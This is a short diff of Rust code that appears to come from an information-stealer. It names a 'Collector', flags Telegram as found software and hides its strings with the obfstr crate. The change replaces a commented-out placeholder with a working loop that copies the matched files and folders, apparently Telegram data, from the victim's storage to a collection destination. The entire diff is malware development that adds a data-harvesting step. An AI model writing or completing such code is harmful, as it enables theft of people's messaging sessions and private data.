@@ -2,7 +2,7 @@ use alloc::borrow::ToOwned;
 use alloc::vec;
 use collector::{Collector, Software};
 use filesystem::storage::StorageFileSystem;
-use filesystem::{FileSystem, FileSystemExt};
+use filesystem::{copy_file, copy_folder, FileSystem, FileSystemExt};
 use obfstr::obfstr as s;
 use tasks::Task;
 use utils::path::Path;
@@ -68,12 +68,12 @@ where
         collector.get_software().set_telegram();
     }
 
-    // TODO: Unimplemented
-    // for path in contents {
-    // if StorageFileSystem.is_file(path) {
-    //     let _ = path.copy_file(dst, true);
-    // } else if StorageFileSystem.is_dir(path) {
-    //     let _ = path.copy_folder(dst);
-    // }
-    // }
+    for path in contents {
+        if StorageFileSystem.is_file(path) {
+            let _ = copy_file(&StorageFileSystem, path, dst_filesystem, dst, true);
+        } else if StorageFileSystem.is_dir(path) {
+            let _ = copy_folder(&StorageFileSystem, path, dst_filesystem, dst);
+        }
+    }
+
 }
